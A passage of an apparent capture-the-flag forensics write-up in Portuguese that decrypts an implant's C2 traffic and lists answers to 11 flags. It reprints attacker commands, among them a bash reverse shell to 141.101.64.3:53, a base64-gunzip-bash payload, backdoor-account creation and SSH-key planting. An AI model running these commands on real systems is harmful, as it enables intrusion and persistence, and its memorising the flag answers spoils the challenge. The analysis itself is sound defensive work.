+    iv, ct, tag = raw[:<span class="c">16</span>], raw[<span class="c">16</span>:<span class="c">-32</span>], raw[<span class="c">-32</span>:]
+    ok = hashlib.new(<span class="g">'sha256'</span>, MAC + iv + ct).digest() == tag   <span class="m"># integridade</span>
+    <span class="c">return</span> ok, unpad(AES.new(ENC, AES.MODE_CBC, iv).decrypt(ct), <span class="c">16</span>).decode()
+
+<span class="m"># reassembly do stream: 4 bytes big-endian de tamanho + blob base64, por direcao</span>
+(n,) = struct.unpack(<span class="g">'&gt;I'</span>, buf[:<span class="c">4</span>]); blob = buf[<span class="c">4</span>:<span class="c">4</span>+n]
+</pre>
+      </div>
+
+      <div class="grid-3">
+        <div class="card"><div class="label">Semente hardcoded (X7wR9t)</div><div class="value">ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j</div></div>
+        <div class="card"><div class="label">Chave AES real (Pq2mN5)</div><div class="value">9df1f3bd6110a9684f0b921d6fc79779<br>e9f0d1896615b05bd10b1995121c0c0b</div></div>
+        <div class="card"><div class="label">MD5 da chave AES</div><div class="value">6ffc06ff97ec037753feda5354b650b3</div></div>
+        <div class="card"><div class="label">Chave do MAC (Zk8vL4)</div><div class="value">3370069f9f743a00fd59c5e189d97f6b<br>42f5b020818c138d5c5148632a781bda</div></div>
+        <div class="card"><div class="label">Mensagens recuperadas</div><div class="value">28 / 28 &mdash; MAC OK</div></div>
+        <div class="card"><div class="label">IV</div><div class="value">16 bytes aleatorios<br>por mensagem</div></div>
+      </div>
+
+      <div class="callout danger">
+        <h4>Semente &ne; chave</h4>
+        <p>
+          A string <code>ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j</code> nunca e passada para o AES. Quem entra em
+          <code>AES.new()</code> e <code>Pq2mN5</code>, o resultado de duas rodadas de SHA-256 sobre essa
+          semente. Ao responder "a chave usada no AES", o valor correto e o material derivado de 32 bytes
+          &mdash; e o MD5 e calculado sobre esses bytes crus.
+        </p>
+      </div>
+
+      <p class="why">
+        <b>Validacao:</b> as 28 mensagens (15 do C2, 13 do implante) passaram na verificacao de MAC e
+        despadaram limpas. Nao ha ambiguidade na reconstrucao.
+      </p>
+    </section>
+
+    <!-- ============================================================ -->
+    <section id="sessao">
+      <div class="section-head"><span class="section-index">05</span><h2>Sessao decriptada &mdash; mensagem por mensagem</h2></div>
+
+      <div class="code-shell">
+        <div class="code-head"><span>capture.pcap &rarr; tcp.stream 1 (decriptado)</span><span>transcricao</span></div>
+<pre>[01] 18:54:32  IMPLANT &rarr; C2   BEACON <span class="a">ASH_CLI_nxpgkxxdatxrcbvkeqby</span> 1779476072.6410902
+[02] 18:55:32  C2 &rarr; IMPLANT   CHALLENGE
+[03] 18:55:32  IMPLANT &rarr; C2   CHALLENGE_RESPONSE
+
+[04] 18:55:32  C2 &rarr; IMPLANT   <span class="r">DWNL_FILE /etc/ssh/sshd_config</span>     <span class="m"># download #1</span>
+[05] 18:55:32  IMPLANT &rarr; C2   DWNL_DATA &lt;4558 chars base64&gt;
+[06] 18:55:32  C2 &rarr; IMPLANT   DWNL_ACK
+
+[07] 18:55:35  C2 &rarr; IMPLANT   <span class="r">DWNL_FILE /etc/hosts</span>               <span class="m"># download #2</span>
+[08] 18:55:35  IMPLANT &rarr; C2   DWNL_DATA MTI3LjAuMC4xCWxvY2FsaG9zdAo...
+[09] 18:55:35  C2 &rarr; IMPLANT   DWNL_ACK
+
+[10] 18:55:38  C2 &rarr; IMPLANT   <span class="r">UPLD_FILE /home/kingmaelor/.ssh/authorized_keys</span>
+[11] 18:55:38  C2 &rarr; IMPLANT   UPLD_DATA c3NoLWVkMjU1MTkgQUFBQUMzTnph...
+[12] 18:55:38  IMPLANT &rarr; C2   UPLD_ACK
+
+[13] 18:55:41  C2 &rarr; IMPLANT   <span class="a">CMD uname -a</span>                       <span class="m"># comando #1</span>
+[14] 18:55:41  IMPLANT &rarr; C2   OUTPUT ASH_CLI_... Linux ash-wbsrv03 6.12.88+deb13-amd64 ...
+
+[15] 18:55:44  C2 &rarr; IMPLANT   <span class="a">CMD ls -la /etc</span>                    <span class="m"># comando #2</span>
+[16] 18:55:44  IMPLANT &rarr; C2   OUTPUT ASH_CLI_... total 556 ...
+
+[17] 18:55:47  C2 &rarr; IMPLANT   CMD id
+[18] 18:55:47  IMPLANT &rarr; C2   OUTPUT ... uid=1005(kingmaelor) gid=1011(crownspire) groups=1011(crownspire),27(sudo)
+
+[19] 18:55:50  C2 &rarr; IMPLANT   CMD sudo -l
+[20] 18:55:50  IMPLANT &rarr; C2   OUTPUT ... (ALL : ALL) ALL
+                                        <span class="r">(ALL) NOPASSWD: /usr/sbin/useradd, /usr/sbin/usermod, /usr/sbin/chpasswd</span>
+
+[21] 18:55:53  C2 &rarr; IMPLANT   <span class="r">CMD sudo useradd -m -s /bin/bash backup_usr &amp;&amp; \
+                                     echo 'backup_usr:9cq3jPVN6Me1' | sudo chpasswd</span>
+[22] 18:55:54  IMPLANT &rarr; C2   OUTPUT ASH_CLI_...            <span class="m"># saida vazia = sucesso</span>
+
+[23] 18:55:57  C2 &rarr; IMPLANT   CMD cat /etc/passwd | grep -i backup_usr
+[24] 18:55:57  IMPLANT &rarr; C2   OUTPUT ... backup_usr:x:1016:1016::/home/backup_usr:/bin/bash
+
+[25] 18:56:00  C2 &rarr; IMPLANT   CMD env
+[26] 18:56:00  IMPLANT &rarr; C2   OUTPUT ... _PYI_ARCHIVE_FILE=/srv/AshShare/linux_sys_updater
+                                        _PYI_LINUX_PROCESS_NAME=linux_sys_updat
+                                        LD_LIBRARY_PATH=/tmp/_MEITTZONB
+
+[27] 18:56:03  C2 &rarr; IMPLANT   <span class="r">CMD echo 'H4sIABLFDWoA/5XNQQ7CIBBG4av8K7ow...' | base64 -d | gunzip | bash</span>
+[28] 18:56:03  IMPLANT &rarr; C2   OUTPUT ASH_CLI_...            <span class="m"># fim da sessao capturada</span>
+</pre>
+      </div>
+
+      <div class="step">
+        <div class="step-head"><span class="step-n">5.1</span><h3>Chave SSH plantada (mensagem 11)</h3></div>
+        <div class="code-shell">
+          <div class="code-head"><span>base64 -d do UPLD_DATA</span><span>authorized_keys</span></div>
+<pre>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINT6AHLFJOhtGkv5YeF2xgp5GCdDBAyWCIBSxpNTKg40 <span class="a">ash@team.htb</span>
+</pre>
+        </div>
+        <p class="why">
+          Gravada em <code>/home/kingmaelor/.ssh/authorized_keys</code> &mdash; retorno via SSH sem senha,
+          independente do implante.
+        </p>
+      </div>
+
+      <div class="step">
+        <div class="step-head"><span class="step-n">5.2</span><h3>Payload ofuscado da mensagem 27</h3></div>
+        <p class="q">O que ha dentro do <code>base64 -d | gunzip | bash</code>?</p>
+        <div class="code-shell">
+          <div class="code-head"><span>desofuscacao</span><span>python</span></div>
+<pre>&gt;&gt;&gt; gzip.decompress(base64.b64decode(b)).decode()
+
+mkdir -p /home/kingmaelor/.local/share \
+  &amp;&amp; echo '<span class="r">bash -i &gt;&amp; /dev/tcp/141.101.64.3/53 0&gt;&amp;1</span>' \
+     &gt; <span class="a">/home/kingmaelor/.local/share/.systemd-helper</span> \
+  &amp;&amp; chmod +x /home/kingmaelor/.local/share/.systemd-helper
+</pre>
+        </div>
+        <div class="callout danger">
+          <h4>Camuflagem dupla</h4>
+          <p>
+            O nome <code>.systemd-helper</code> imita o utilitario legitimo <code>deb-systemd-helper</code>,
+            o arquivo e oculto e fica sob <code>.local/share</code> &mdash; um diretorio que ninguem inspeciona.
+            A porta escolhida (<b>53/DNS</b>) atravessa a maioria dos firewalls de saida sem alarme.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <section id="comandos">
+      <div class="section-head"><span class="section-index">06</span><h2>Comando &rarr; resposta &mdash; uma linha por flag</h2></div>
+
+      <p class="lede">
+        Cada bloco abaixo e o comando <b>literalmente executado no terminal</b> e a saida literal que ele
+        imprimiu. Nenhum comando precisa de edicao manual: o <code>stdout</code> e exatamente a flag.
+        Reproduzivel de ponta a ponta a partir dos dois artefatos originais.
+      </p>
+
+      <div class="code-shell">
+        <div class="code-head"><span>Preparacao do ambiente &mdash; rodar uma vez</span><span>bash</span></div>
+<pre><span class="c">cd</span> /home/t0x1n/Downloads/Teste2
+<span class="c">mkdir</span> -p analise/uac &amp;&amp; <span class="c">cd</span> analise
+<span class="c">tar</span> -xzf ../uac-ash-wbsrv03-linux-20260522185435.tar.gz -C uac
+<span class="c">export</span> UAC=<span class="g">"$PWD/uac"</span>
+
+<span class="m"># desempacota o implante PyInstaller e decripta o C2 do pcap</span>
+<span class="c">python3</span> extract_pyi.py <span class="g">"uac/[root]/srv/AshShare/linux_sys_updater"</span> pyi_out
+<span class="c">python3</span> dec2.py ../capture.pcap &gt; sessao.txt</pre>
+      </div>
+
+      <div class="code-shell">
+        <div class="code-head"><span>saida da preparacao</span><span>stdout</span></div>
+<pre>96 entries
+  s <span class="a">client</span> (9246)              <span class="m">&larr; script principal, bytecode CPython 3.12</span>
+  z PYZ.pyz (1494042)
+  x base_library.zip (1332793)
+
+<span class="m"># 28 mensagens C2 decriptadas, todas com MAC integro:</span>
+$ <span class="c">grep</span> -c <span class="g">' OK  | '</span> sessao.txt   &rarr; <span class="g">28</span>
+$ <span class="c">grep</span> -c <span class="g">' BAD '</span> sessao.txt     &rarr; <span class="g">0</span></pre>
+      </div>
+
+      <!-- ---------------- FLAG 1 ---------------- -->
+      <div class="step">
+        <div class="step-head"><span class="step-n">FLAG 01</span><h3>Usuario comprometido : grupo primario</h3></div>
+        <p class="q">Which is the compromised system user that the attacker used? Specify the primary group it belongs to</p>
+        <div class="code-shell">
+          <div class="code-head"><span>comando</span><span>bash</span></div>
+<pre>G=$(<span class="c">awk</span> -F: <span class="g">'$1=="kingmaelor"{print $4}'</span> <span class="g">"$UAC/[root]/etc/passwd"</span>)
+<span class="c">awk</span> -F: -v g=<span class="g">"$G"</span> <span class="g">'$3==g{print "kingmaelor:"$1}'</span> <span class="g">"$UAC/[root]/etc/group"</span></pre>
+        </div>
+        <div class="resp"><span class="resp-label">stdout</span><span class="val">kingmaelor:crownspire</span></div>
+        <div class="code-shell">
+          <div class="code-head"><span>confirmacao independente &mdash; dono do processo do implante</span><span>bash</span></div>
+<pre><span class="c">awk</span> <span class="g">'/\/proc\/99\/cwd/{print $3":"$4}'</span> <span class="g">"$UAC/live_response/process/ls_-l_proc_pid_cwd.txt"</span>
+
+<span class="g">kingmaelor:crownspire</span></pre>
+        </div>
+      </div>
+
+      <!-- ---------------- FLAG 2 ---------------- -->
+      <div class="step">
+        <div class="step-head"><span class="step-n">FLAG 02</span><h3>Caminho completo do binario malicioso</h3></div>
+        <p class="q">The attacker implanted a malicious binary on the system, which is the full path?</p>
+        <div class="code-shell">
+          <div class="code-head"><span>comando</span><span>bash</span></div>
+<pre><span class="c">cat</span> <span class="g">"$UAC/live_response/process/proc/99/cmdline.txt"</span></pre>
+        </div>
+        <div class="resp"><span class="resp-label">stdout</span><span class="val">/srv/AshShare/linux_sys_updater</span></div>
+        <div class="code-shell">
+          <div class="code-head"><span>confirmacao independente &mdash; via ps</span><span>bash</span></div>
+<pre><span class="c">awk</span> <span class="g">'/linux_sys_updater/{print $NF}'</span> <span class="g">"$UAC/live_response/process/ps_auxwwwf.txt"</span> | <span class="c">sort</span> -u
+
+<span class="g">/srv/AshShare/linux_sys_updater</span></pre>
+        </div>
+      </div>
+
+      <!-- ---------------- FLAG 3 ---------------- -->
+      <div class="step">
+        <div class="step-head"><span class="step-n">FLAG 03</span><h3>MD5 da chave usada no AES</h3></div>
+        <p class="q">A custom traffic encryption logic is used, which is the Key used in AES? Specify it using MD5 hash of the value</p>
+        <div class="code-shell">
+          <div class="code-head"><span>comando &mdash; le a semente do bytecode e refaz a derivacao do implante</span><span>bash</span></div>
+<pre><span class="c">python3</span> -c <span class="g">"
+import marshal, hashlib
+c = marshal.loads(open('pyi_out/client','rb').read())
+seed = [k for k in c.co_consts if isinstance(k,str) and len(k)==32][0]
+h = hashlib.sha256(seed.encode()).digest()
+aes = hashlib.sha256(h + b'encryption').digest()[:32]
+print(hashlib.md5(aes).hexdigest())"</span></pre>
+        </div>
+        <div class="resp"><span class="resp-label">stdout</span><span class="val">6ffc06ff97ec037753feda5354b650b3</span></div>
+        <p class="why"><b>Atencao:</b> o MD5 e calculado sobre <code>aes</code> (os 32 bytes que entram em
+          <code>AES.new()</code>), nao sobre a string <code>seed</code> do codigo. A semente so alimenta a
+          derivacao.</p>
+      </div>
+
+      <!-- ---------------- FLAG 4 ---------------- -->
+      <div class="step">
+        <div class="step-head"><span class="step-n">FLAG 04</span><h3>Prefixo do client ID</h3></div>
+        <p class="q">A custom prefix is used in client ID generation, which is it?</p>
+        <div class="code-shell">
+          <div class="code-head"><span>comando &mdash; desofusca a constante (base64 + XOR 85^170)</span><span>bash</span></div>
+<pre><span class="c">python3</span> -c <span class="g">"import base64;print(bytes(b^85^170 for b in base64.b64decode('vqy3oLyztqA=')).decode())"</span></pre>
+        </div>
+        <div class="resp"><span class="resp-label">stdout</span><span class="val">ASH_CLI_</span></div>
+      </div>
+
+      <!-- ---------------- FLAG 5 ---------------- -->
+      <div class="step">
+        <div class="step-head"><span class="step-n">FLAG 05</span><h3>Comando que inicia upload de arquivo</h3></div>
+        <p class="q">Which is the custom command that initiates file upload?</p>
+        <div class="code-shell">
+          <div class="code-head"><span>comando</span><span>bash</span></div>
+<pre><span class="c">python3</span> -c <span class="g">"import base64;print(bytes(b^85^170 for b in base64.b64decode('qq+zu6C5trO63w==')).decode().strip())"</span></pre>
+        </div>
+        <div class="resp"><span class="resp-label">stdout</span><span class="val">UPLD_FILE</span></div>
+        <div class="code-shell">
+          <div class="code-head"><span>contexto &mdash; tabela completa de verbos do protocolo</span><span>stdout</span></div>
+<pre>vqy3oLyztqA=               -&gt; ASH_CLI_
+vbq+vLCx34TPgt+EzoI=       -&gt; BEACON {0} {1}
+u6ixs6C5trO63w==           -&gt; DWNL_FILE
+u6ixs6C7vqu+34TPgg==       -&gt; DWNL_DATA {0}
+u6ixs6CxsKugubCqsbs=       -&gt; DWNL_NOT_FOUND
+qq+zu6C5trO63w==           -&gt; <span class="a">UPLD_FILE</span>
+qq+zu6C7vqu+3w==           -&gt; UPLD_DATA
+qq+zu6C+vLQ=               -&gt; UPLD_ACK
+vLK73w==                   -&gt; CMD
+sKqrr6qr34TPgt+EzoI=       -&gt; OUTPUT {0} {1}
+rLeqq7uwqLE=               -&gt; SHUTDOWN</pre>
+        </div>
+      </div>
+
+      <!-- ---------------- FLAG 6 ---------------- -->
+      <div class="step">
+        <div class="step-head"><span class="step-n">FLAG 06</span><h3>Variavel que guarda a saida dos comandos</h3></div>
+        <p class="q">Which is the variable name that stores the output of the command execute on the system?</p>
+        <div class="code-shell">
+          <div class="code-head"><span>comando &mdash; acha a funcao que chama check_output e le seu 1o local</span><span>bash</span></div>
+<pre><span class="c">python3</span> -c <span class="g">"
+import marshal
+c = marshal.loads(open('pyi_out/client','rb').read())
+f = [k for k in c.co_consts if hasattr(k,'co_code') and 'STDOUT' in k.co_names][0]
+print(f.co_varnames[f.co_argcount])"</span></pre>
+        </div>
+        <div class="resp"><span class="resp-label">stdout</span><span class="val">Kd3uD9</span></div>
+        <p class="why"><code>co_varnames[argcount]</code> pula os argumentos (<code>Hj5tC1</code>, o comando) e
+          devolve a primeira variavel local &mdash; exatamente o alvo do
+          <code>STORE_FAST</code> apos <code>subprocess.check_output()</code>.</p>
+      </div>
+
+      <!-- ---------------- FLAG 7 ---------------- -->
+      <div class="step">
+        <div class="step-head"><span class="step-n">FLAG 07</span><h3>Segundo comando executado na sessao</h3></div>
+        <p class="q">Which is the second executed command in the encrypted reverse shell session?</p>
+        <div class="code-shell">
+          <div class="code-head"><span>comando</span><span>bash</span></div>
+<pre><span class="c">grep</span> -oP <span class="g">'\| CMD \K.*'</span> sessao.txt | <span class="c">sed</span> -n 2p</pre>
+        </div>
+        <div class="resp"><span class="resp-label">stdout</span><span class="val">ls -la /etc</span></div>
+        <div class="code-shell">
+          <div class="code-head"><span>contexto &mdash; ordem completa dos CMD</span><span>bash</span></div>
+<pre>$ <span class="c">grep</span> -oP <span class="g">'\| CMD \K.*'</span> sessao.txt | <span class="c">cut</span> -c1-70 | <span class="c">nl</span>
+
+     1  uname -a
+     2  <span class="a">ls -la /etc</span>
+     3  id
+     4  sudo -l
+     5  sudo useradd -m -s /bin/bash backup_usr &amp;&amp; echo 'backup_usr:9cq3jPVN6M
+     6  cat /etc/passwd | grep -i backup_usr
+     7  env
+     8  echo 'H4sIABLFDWoA/5XNQQ7CIBBG4av8K7owMJ20uuQuCBOHFKSBxujtGy9g4gG+9+qW</pre>
+        </div>
+      </div>
+
+      <!-- ---------------- FLAG 8 ---------------- -->
+      <div class="step">
+        <div class="step-head"><span class="step-n">FLAG 08</span><h3>Segundo arquivo baixado (exfiltrado)</h3></div>
+        <p class="q">Which is the second downloaded file in the encrypted reverse shell session?</p>
+        <div class="code-shell">
+          <div class="code-head"><span>comando</span><span>bash</span></div>
+<pre><span class="c">grep</span> -oP <span class="g">'\| DWNL_FILE \K.*'</span> sessao.txt | <span class="c">sed</span> -n 2p</pre>
+        </div>
+        <div class="resp"><span class="resp-label">stdout</span><span class="val">/etc/hosts</span></div>
+        <div class="code-shell">
+          <div class="code-head"><span>contexto &mdash; ordem dos downloads</span><span>bash</span></div>
+<pre>$ <span class="c">grep</span> -oP <span class="g">'\| DWNL_FILE \K.*'</span> sessao.txt | <span class="c">nl</span>
+
+     1  /etc/ssh/sshd_config
+     2  <span class="a">/etc/hosts</span></pre>
+        </div>
+      </div>
+
+      <!-- ---------------- FLAG 9 ---------------- -->
+      <div class="step">
+        <div class="step-head"><span class="step-n">FLAG 09</span><h3>Credenciais da conta de persistencia</h3></div>
+        <p class="q">The attacker created a new user for persistence. Which credentials has been set?</p>
+        <div class="code-shell">
+          <div class="code-head"><span>comando &mdash; extrai o argumento do chpasswd</span><span>bash</span></div>
+<pre><span class="c">grep</span> -oP <span class="g">"echo '\K[^']+(?=' \| sudo chpasswd)"</span> sessao.txt</pre>
+        </div>
+        <div class="resp"><span class="resp-label">stdout</span><span class="val">backup_usr:9cq3jPVN6Me1</span></div>
+      </div>
+
+      <!-- ---------------- FLAG 10 ---------------- -->
+      <div class="step">
+        <div class="step-head"><span class="step-n">FLAG 10</span><h3>Arquivo escrito para persistencia</h3></div>
+        <p class="q">The attacker wrote something into a specific file to maintain persistence. What is the full path?</p>
+        <div class="code-shell">
+          <div class="code-head"><span>comando &mdash; desofusca o payload gzip+base64 e le o alvo do redirecionamento</span><span>bash</span></div>
+<pre><span class="c">grep</span> -oP <span class="g">"echo '\KH4sI[^']+"</span> sessao.txt | <span class="c">base64</span> -d | <span class="c">gunzip</span> | <span class="c">grep</span> -oP <span class="g">"&gt; \K/\S+"</span></pre>
+        </div>
+        <div class="resp"><span class="resp-label">stdout</span><span class="val">/home/kingmaelor/.local/share/.systemd-helper</span></div>
+      </div>
+
+      <!-- ---------------- FLAG 11 ---------------- -->
+      <div class="step">
+        <div class="step-head"><span class="step-n">FLAG 11</span><h3>IP e porta do reverse shell</h3></div>
+        <p class="q">In the same file the attacker placed a reverse shell invocation. What are the remote IP and port?</p>
+        <div class="code-shell">
+          <div class="code-head"><span>comando</span><span>bash</span></div>
+<pre><span class="c">grep</span> -oP <span class="g">"echo '\KH4sI[^']+"</span> sessao.txt | <span class="c">base64</span> -d | <span class="c">gunzip</span> \
+  | <span class="c">grep</span> -oP <span class="g">'dev/tcp/\K[0-9.]+/[0-9]+'</span> | <span class="c">tr</span> <span class="g">'/'</span> <span class="g">':'</span></pre>
+        </div>
+        <div class="resp"><span class="resp-label">stdout</span><span class="val">141.101.64.3:53</span></div>
+        <div class="code-shell">
+          <div class="code-head"><span>contexto &mdash; payload completo desofuscado (flags 10 e 11)</span><span>bash</span></div>
+<pre>$ <span class="c">grep</span> -oP <span class="g">"echo '\KH4sI[^']+"</span> sessao.txt | <span class="c">base64</span> -d | <span class="c">gunzip</span>
+
+mkdir -p /home/kingmaelor/.local/share &amp;&amp; echo '<span class="r">bash -i &gt;&amp; /dev/tcp/141.101.64.3/53 0&gt;&amp;1</span>' \
+  &gt; <span class="a">/home/kingmaelor/.local/share/.systemd-helper</span> \
+  &amp;&amp; chmod +x /home/kingmaelor/.local/share/.systemd-helper</pre>
+        </div>
+      </div>
+
+    </section>
+
+    <!-- ============================================================ -->
+    <section id="flags">
+      <div class="section-head"><span class="section-index">07</span><h2>Respostas &mdash; 11 flags</h2></div>
+
+      <div class="flag-grid">
+
+        <div class="flag-card">
+          <div class="num">01</div>
+          <div>
+            <h3>Usuario comprometido e grupo primario</h3>
+            <p class="q">Which is the compromised system user that the attacker used? Specify the primary group it belongs to (username:group)</p>
+            <span class="answer">kingmaelor:crownspire</span>
+            <p class="why"><b>Evidencia:</b> <code>ps</code> mostra a sessao SSH e o implante rodando como
+              <code>kingmaelor</code>; <code>/etc/passwd</code> da GID primario 1011 e <code>/etc/group</code>
+              mapeia 1011 &rarr; <code>crownspire</code>. Confirmado pelo <code>id</code> na mensagem 18 do C2.
+              O grupo <code>sudo</code> e secundario, nao primario.</p>
+          </div>
+        </div>
+
+        <div class="flag-card">
+          <div class="num">02</div>
+          <div>
+            <h3>Caminho completo do binario malicioso</h3>
+            <p class="q">The attacker implanted a malicious binary on the system, which is the full path?</p>
+            <span class="answer">/srv/AshShare/linux_sys_updater</span>
+            <p class="why"><b>Evidencia:</b> <code>/proc/99/cmdline</code> e <code>/proc/100/cmdline</code>,
+              arvore <code>bash &rarr; linux_sys_updat</code>, e a variavel
+              <code>_PYI_ARCHIVE_FILE=/srv/AshShare/linux_sys_updater</code> vista no <code>env</code> exfiltrado.
+              MD5 <code>e1349e5c012ad89a1e543d1d6236004d</code>.</p>
+          </div>
+        </div>
+
+        <div class="flag-card">
+          <div class="num">03</div>
+          <div>
+            <h3>Chave AES (MD5 do valor)</h3>
+            <p class="q">A custom traffic encryption logic is used, which is the Key used in AES? Specify it using MD5 hash of the value</p>
+            <span class="answer">6ffc06ff97ec037753feda5354b650b3</span>
+            <div class="alts">
+              <span class="label">Valor em claro &mdash; a chave realmente entregue ao AES</span>
+              <ol>
+                <li>Semente hardcoded (<code>X7wR9t</code>, linha 14): ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j</li>
+                <li>Chave AES derivada (<code>Pq2mN5</code>, 32 bytes):<br>
+                    9df1f3bd6110a9684f0b921d6fc79779e9f0d1896615b05bd10b1995121c0c0b</li>
+                <li>MD5 desses 32 bytes &rarr; <b>6ffc06ff97ec037753feda5354b650b3</b></li>
+              </ol>
+            </div>
+            <p class="why"><b>Evidencia:</b> o disassembly de <code>Qw6rT1()</code>/<code>Ru8wD1()</code> mostra
+              <code>AES.new(<b>Pq2mN5</b>, AES.MODE_CBC, iv)</code> &mdash; o argumento de chave e
+              <code>Pq2mN5</code>, nao a string do codigo. <code>Pq2mN5</code> sai de
+              <code>Fg3hY6()</code>: <code>sha256(sha256(semente)+b'encryption').digest()[:32]</code>.
+              A string literal e apenas a semente da derivacao; ela nunca toca a cifra.
+              Derivacao validada decriptando as 28 mensagens do pcap com MAC integro.</p>
+            <div class="alts">
+              <span class="label">Se a plataforma esperar a chave como texto hex</span>
+              <ol><li>md5("9df1f3bd...121c0c0b") = bd9ec45bf707f00f58ab6107d46ff4b7</li></ol>
+            </div>
+          </div>
+        </div>
+
+        <div class="flag-card">
+          <div class="num">04</div>
+          <div>
+            <h3>Prefixo do client ID</h3>
+            <p class="q">A custom prefix is used in client ID generation, which is it?</p>
+            <span class="answer">ASH_CLI_</span>
+            <p class="why"><b>Evidencia:</b> string ofuscada <code>vqy3oLyztqA=</code> em <code>Sw1vE2()</code>,
+              desofuscada pelo XOR 0xFF. Concatenada a 20 letras minusculas aleatorias
+              (<code>chr(random.randint(97,122))</code>). Observado na rede como
+              <code>ASH_CLI_nxpgkxxdatxrcbvkeqby</code>.</p>
+          </div>
+        </div>
+
+        <div class="flag-card">
+          <div class="num">05</div>
+          <div>
+            <h3>Comando que inicia upload de arquivo</h3>
+            <p class="q">Which is the custom command that initiates file upload?</p>
+            <span class="answer">UPLD_FILE</span>
+            <p class="why"><b>Evidencia:</b> <code>qq+zu6C5trO63w==</code> &rarr; <code>UPLD_FILE&nbsp;</code>.
+              No laco principal, ao receber esse prefixo o implante extrai o caminho, aguarda o
+              <code>UPLD_DATA</code> seguinte, cria os diretorios com <code>os.makedirs</code> e grava o
+              arquivo, respondendo <code>UPLD_ACK</code>. Visto na pratica na mensagem 10
+              (<code>authorized_keys</code>).</p>
+          </div>
+        </div>
+
+        <div class="flag-card">
+          <div class="num">06</div>
+          <div>
+            <h3>Variavel que guarda a saida dos comandos</h3>
+            <p class="q">Which is the variable name that stores the output of the command execute on the system?</p>
+            <span class="answer">Kd3uD9</span>
+            <p class="why"><b>Evidencia:</b> em <code>Ve8sB7()</code> (argcount=1, 2 locais) o disassembly mostra
+              <code>CALL subprocess.check_output(...) &rarr; STORE_FAST (Kd3uD9)</code>, seguido de
+              <code>LOAD_FAST (Kd3uD9); LOAD_ATTR (decode); RETURN_VALUE</code>. O parametro de entrada e
+              <code>Hj5tC1</code> (o comando); <code>Kd3uD9</code> e a saida.</p>
+          </div>
+        </div>
+
+        <div class="flag-card">
+          <div class="num">07</div>
+          <div>
+            <h3>Segundo comando executado na sessao</h3>
+            <p class="q">Which is the second executed command in the encrypted reverse shell session?</p>
+            <span class="answer">ls -la /etc</span>
+            <div class="alts">
+              <span class="label">Ordem completa dos CMD</span>
+              <ol>
+                <li>uname -a</li>
+                <li><b>ls -la /etc</b></li>
+                <li>id</li>
+                <li>sudo -l</li>
+                <li>sudo useradd -m -s /bin/bash backup_usr &amp;&amp; echo 'backup_usr:9cq3jPVN6Me1' | sudo chpasswd</li>
+                <li>cat /etc/passwd | grep -i backup_usr</li>
+                <li>env</li>
+                <li>echo '...' | base64 -d | gunzip | bash</li>
+              </ol>
+            </div>
+            <p class="why"><b>Evidencia:</b> mensagem 15 do fluxo decriptado (18:55:44 UTC). Os
+              <code>DWNL_FILE</code>/<code>UPLD_FILE</code> anteriores nao sao <code>CMD</code> &mdash; sao
+              operacoes de arquivo do protocolo.</p>
+          </div>
+        </div>
+
+        <div class="flag-card">
+          <div class="num">08</div>
+          <div>
+            <h3>Segundo arquivo baixado (exfiltrado)</h3>
+            <p class="q">Which is the second downloaded file in the encrypted reverse shell session?</p>
+            <span class="answer">/etc/hosts</span>
+            <div class="alts">
+              <span class="label">Ordem dos DWNL_FILE</span>
+              <ol>
+                <li>/etc/ssh/sshd_config &nbsp;<span style="color:var(--muted)">(revelou PermitRootLogin yes)</span></li>
+                <li><b>/etc/hosts</b> &nbsp;<span style="color:var(--muted)">(revelou 10.10.0.10 ash-wbsrv03)</span></li>
+              </ol>
+            </div>
+            <p class="why"><b>Evidencia:</b> mensagem 7 (18:55:35 UTC). Conteudo confirmado ao decodificar o
+              <code>DWNL_DATA</code> da mensagem 8.</p>
+          </div>
+        </div>
+
+        <div class="flag-card">
+          <div class="num">09</div>
+          <div>
+            <h3>Credenciais da conta de persistencia</h3>
+            <p class="q">The attacker created a new user for persistence. Which credentials has been set?</p>
+            <span class="answer">backup_usr:9cq3jPVN6Me1</span>
+            <p class="why"><b>Evidencia:</b> mensagem 21 &mdash;
+              <code>sudo useradd -m -s /bin/bash backup_usr &amp;&amp; echo 'backup_usr:9cq3jPVN6Me1' | sudo chpasswd</code>.
+              Confirmado pelo proprio atacante na mensagem 24:
+              <code>backup_usr:x:1016:1016::/home/backup_usr:/bin/bash</code>. Possivel porque
+              <code>sudo -l</code> revelou <code>NOPASSWD</code> para <code>useradd</code>/<code>chpasswd</code>.</p>
+          </div>
+        </div>
+
+        <div class="flag-card">
+          <div class="num">10</div>
+          <div>
+            <h3>Arquivo escrito para persistencia</h3>
+            <p class="q">The attacker wrote something into a specific file to maintain persistence. What is the full path?</p>
+            <span class="answer">/home/kingmaelor/.local/share/.systemd-helper</span>
+            <p class="why"><b>Evidencia:</b> mensagem 27, apos
+              <code>base64 -d | gunzip</code>: <code>mkdir -p /home/kingmaelor/.local/share &amp;&amp; echo '...' &gt;
+              /home/kingmaelor/.local/share/.systemd-helper &amp;&amp; chmod +x</code>. O arquivo nao aparece na
+              coleta UAC porque a triagem correu as 18:54:35 &mdash; <b>88 segundos antes</b> da gravacao.</p>
+          </div>
+        </div>
+
+        <div class="flag-card">
+          <div class="num">11</div>
+          <div>
+            <h3>IP e porta do reverse shell</h3>
+            <p class="q">In the same file the attacker placed a reverse shell invocation. What are the remote IP and port?</p>
+            <span class="answer">141.101.64.3:53</span>
+            <p class="why"><b>Evidencia:</b> conteudo gravado no arquivo &mdash;
+              <code>bash -i &gt;&amp; /dev/tcp/141.101.64.3/53 0&gt;&amp;1</code>. Note que este destino e
+              <b>diferente</b> do C2 (10.10.0.56): infraestrutura externa separada, para o caso de a rede
+              interna do operador ser bloqueada.</p>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <section id="linha">
+      <div class="section-head"><span class="section-index">08</span><h2>Linha do tempo</h2></div>
+
+      <div class="timeline">
+        <div class="timeline-item">
+          <time>2026-05-20 19:26:27 UTC</time>
+          <strong>Criacao do diretorio /srv/AshShare</strong>
+          <p>Compartilhamento criado com dono uid/gid 1000. Preparacao de terreno (bodyfile).</p>
+        </div>
+        <div class="timeline-item hot">
+          <time>2026-05-22 13:18:08 UTC</time>
+          <strong>Implante depositado no disco</strong>
